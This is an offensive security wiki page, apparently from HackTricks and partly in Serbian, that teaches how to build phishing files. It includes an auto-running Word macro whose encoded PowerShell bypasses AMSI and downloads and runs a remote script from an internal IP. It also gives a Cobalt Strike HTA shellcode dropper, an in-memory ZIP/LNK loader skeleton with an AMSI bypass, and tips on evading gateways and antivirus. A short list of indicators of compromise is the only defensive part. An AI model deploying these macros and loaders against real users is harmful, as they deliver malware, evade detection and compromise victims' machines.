# Phishing Fajlovi & Dokumenti

{{#include ../../banners/hacktricks-training.md}}

## Office Dokumenti

Microsoft Word vrši validaciju podataka fajla pre nego što otvori fajl. Validacija podataka se izvodi u obliku identifikacije strukture podataka, u skladu sa OfficeOpenXML standardom. Ako se pojavi bilo koja greška tokom identifikacije strukture podataka, fajl koji se analizira neće biti otvoren.

Uobičajeno, Word fajlovi koji sadrže makroe koriste ekstenziju `.docm`. Međutim, moguće je preimenovati fajl menjajući ekstenziju i i dalje zadržati mogućnost izvršavanja makroa.\
Na primer, RTF fajl po dizajnu ne podržava makroe, ali DOCM fajl preimenovan u RTF biće tretiran od strane Microsoft Worda i biće sposoban za izvršavanje makroa.\
Ista interna struktura i mehanizmi važe za sav softver iz Microsoft Office Suite-a (Excel, PowerPoint itd.).

Možete koristiti sledeću komandu da proverite koje ekstenzije će biti izvršavane od strane nekih Office programa:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### External Image Load

Idite na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Moguće je koristiti makroe da biste pokrenuli proizvoljni kod iz dokumenta.

#### Autoload functions

Što su češće, to je verovatnije da će ih AV detektovati.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

Idite na **File > Info > Inspect Document > Inspect Document**, što će otvoriti Document Inspector. Kliknite **Inspect** i zatim **Remove All** pored **Document Properties and Personal Information**.

#### Doc Extension

Kada završite, izaberite padajući meni **Save as type**, promenite format iz **`.docx`** u **Word 97-2003 `.doc`**.\
Radite to zato što **you can't save macro's inside a `.docx`** i postoji stigma oko macro-enabled **`.docm`** ekstenzije (npr. ikona sličice ima veliki `!` i neki web/email gateway blokiraju ih u potpunosti). Stoga je ova nasleđena `.doc` ekstenzija najbolji kompromis.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

HTA je Windows program koji **combines HTML and scripting languages (such as VBScript and JScript)**. On generiše korisnički interfejs i izvršava se kao "fully trusted" aplikacija, bez ograničenja sigurnosnog modela pregledača.

HTA se izvršava pomoću **`mshta.exe`**, koji je tipično **installed** zajedno sa **Internet Explorer**, što čini **`mshta` dependant on IE**. Dakle, ako je on deinstaliran, HTA fajlovi neće moći da se izvrše.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forsiranje NTLM autentifikacije

Postoji nekoliko načina da se **forsira NTLM autentifikacija "na daljinu"**, na primer, možete dodati **nevidljive slike** u emailove ili HTML koje će korisnik otvoriti (čak i HTTP MitM?). Ili poslati žrtvi **adresu fajlova** koja će **pokrenuti** **autentifikaciju** samo otvaranjem mape.

**Pogledajte ove ideje i još više na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da pored krađe heša ili autentifikacije možete i **perform NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna mamca dokumenta (PDF/DOCX) i zlonamerni .lnk. Trik je u tome što je stvarni PowerShell loader smešten unutar sirovih bajtova ZIP-a nakon jedinstvenog markera, a .lnk ga izdvaja i izvršava potpuno u memoriji.

Tipični tok koji implementira .lnk PowerShell one-liner:

1) Pronađi originalni ZIP u uobičajenim putanjama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i roditelj trenutnog radnog direktorijuma.
2) Pročitaj bajtove ZIP-a i pronađi hardkodovani marker (npr. xFIQCV). Sve nakon markera je ugrađeni PowerShell payload.
3) Kopiraj ZIP u %ProgramData%, raspakuj tamo i otvori mamac .docx da bi izgledalo legitimno.
4) Zaobiđi AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskuj narednu fazu (npr. ukloni sve # karaktere) i izvrši je u memoriji.

Primer PowerShell skeleta za izdvajanje i pokretanje ugrađene faze:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Napomene
- Delivery često zloupotrebljava pouzdane PaaS poddomene (npr. *.herokuapp.com) i može ograničiti pristup payloads (servira benign ZIP-ove na osnovu IP/UA).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga putem Reflection.Emit + VirtualAlloc kako bi minimalizovala tragove na disku.

Persistence korišćena u istom lancu
- COM TypeLib hijacking of the Microsoft Web Browser control tako da IE/Explorer ili bilo koja aplikacija koja ga ugradjuje automatski ponovo pokrene payload. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP files containing the ASCII marker string (npr. xFIQCV) dodat na podatke arhive.
- .lnk koji enumeriše parent/user foldere da pronađe ZIP i otvara lažni dokument.
- AMSI manipulacija putem [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugotrajni poslovni thread-ovi koji se završavaju linkovima hostovanim pod pouzdanim PaaS domenima.

## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
